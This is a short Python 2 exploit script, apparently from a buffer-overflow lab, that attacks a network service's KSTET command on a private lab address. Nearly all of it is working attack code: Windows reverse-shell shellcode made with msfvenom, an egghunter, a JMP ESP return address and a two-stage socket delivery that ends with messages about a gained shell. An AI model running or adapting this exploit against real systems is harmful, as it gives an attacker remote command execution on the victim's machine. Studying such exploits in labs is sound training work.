#!/usr/bin/python2

import socket
import sys

host = "10.10.168.236"
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT EXITFUNC=thread -b "\x00" -f c

shellcode = (
'\xdd\xc4\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x52\xbe\x86\x47\x03'
'\x2f\x31\x73\x17\x03\x73\x17\x83\x6d\xbb\xe1\xda\x8d\xac\x64'
'\x24\x6d\x2d\x09\xac\x88\x1c\x09\xca\xd9\x0f\xb9\x98\x8f\xa3'
'\x32\xcc\x3b\x37\x36\xd9\x4c\xf0\xfd\x3f\x63\x01\xad\x7c\xe2'
'\x81\xac\x50\xc4\xb8\x7e\xa5\x05\xfc\x63\x44\x57\x55\xef\xfb'
'\x47\xd2\xa5\xc7\xec\xa8\x28\x40\x11\x78\x4a\x61\x84\xf2\x15'
'\xa1\x27\xd6\x2d\xe8\x3f\x3b\x0b\xa2\xb4\x8f\xe7\x35\x1c\xde'
'\x08\x99\x61\xee\xfa\xe3\xa6\xc9\xe4\x91\xde\x29\x98\xa1\x25'
'\x53\x46\x27\xbd\xf3\x0d\x9f\x19\x05\xc1\x46\xea\x09\xae\x0d'
'\xb4\x0d\x31\xc1\xcf\x2a\xba\xe4\x1f\xbb\xf8\xc2\xbb\xe7\x5b'
'\x6a\x9a\x4d\x0d\x93\xfc\x2d\xf2\x31\x77\xc3\xe7\x4b\xda\x8c'
'\xc4\x61\xe4\x4c\x43\xf1\x97\x7e\xcc\xa9\x3f\x33\x85\x77\xb8'
'\x34\xbc\xc0\x56\xcb\x3f\x31\x7f\x08\x6b\x61\x17\xb9\x14\xea'
'\xe7\x46\xc1\xbd\xb7\xe8\xba\x7d\x67\x49\x6b\x16\x6d\x46\x54'
'\x06\x8e\x8c\xfd\xad\x75\x47\x08\x23\x66\x66\x64\x41\x88\x99'
'\x29\xcc\x6e\xf3\xc1\x98\x39\x6c\x7b\x81\xb1\x0d\x84\x1f\xbc'
'\x0e\x0e\xac\x41\xc0\xe7\xd9\x51\xb5\x07\x94\x0b\x10\x17\x02'
'\x23\xfe\x8a\xc9\xb3\x89\xb6\x45\xe4\xde\x09\x9c\x60\xf3\x30'
'\x36\x96\x0e\xa4\x71\x12\xd5\x15\x7f\x9b\x98\x22\x5b\x8b\x64'
'\xaa\xe7\xff\x38\xfd\xb1\xa9\xfe\x57\x70\x03\xa9\x04\xda\xc3'
'\x2c\x67\xdd\x95\x30\xa2\xab\x79\x80\x1b\xea\x86\x2d\xcc\xfa'
'\xff\x53\x6c\x04\x2a\xd0\x8c\xe7\xfe\x2d\x25\xbe\x6b\x8c\x28'
'\x41\x46\xd3\x54\xc2\x62\xac\xa2\xda\x07\xa9\xef\x5c\xf4\xc3'
'\x60\x09\xfa\x70\x80\x18'
)

# msf-egghunter -f raw  -e hack -v egghunter -p windows -a x86 -f c

egghunter = ('\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a'
'\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7\xaf\x75\xea\xaf\x75\xe7'
'\xff\xe7')

buffer = 'A' * 22
buffer += egghunter
buffer += 'A' * (66 - len(buffer))
buffer += '\xaf\x11\x50\x62' # JMP ESP
buffer += '\xeb\xce' # jmp $-50
buffer += 'C' * (1000 - len(buffer)) # Junk

# For Sending 2nd Stage Shellcode

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("[+] Sending Shellcodes")
s.send("ATHIS " + "hackhack" + shellcode)
print("[+] Shellcodes Sent")
s.recv(1024)

# For Sending 1st Stage Shellcode
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("[+] Triggering Exploit")
print("[+] Hack The Planet")
s.send("KSTET /.:/" + buffer)
print("[+] Pwned Successfully!!!")
print("[+] You Might gotta Reverse Shell")

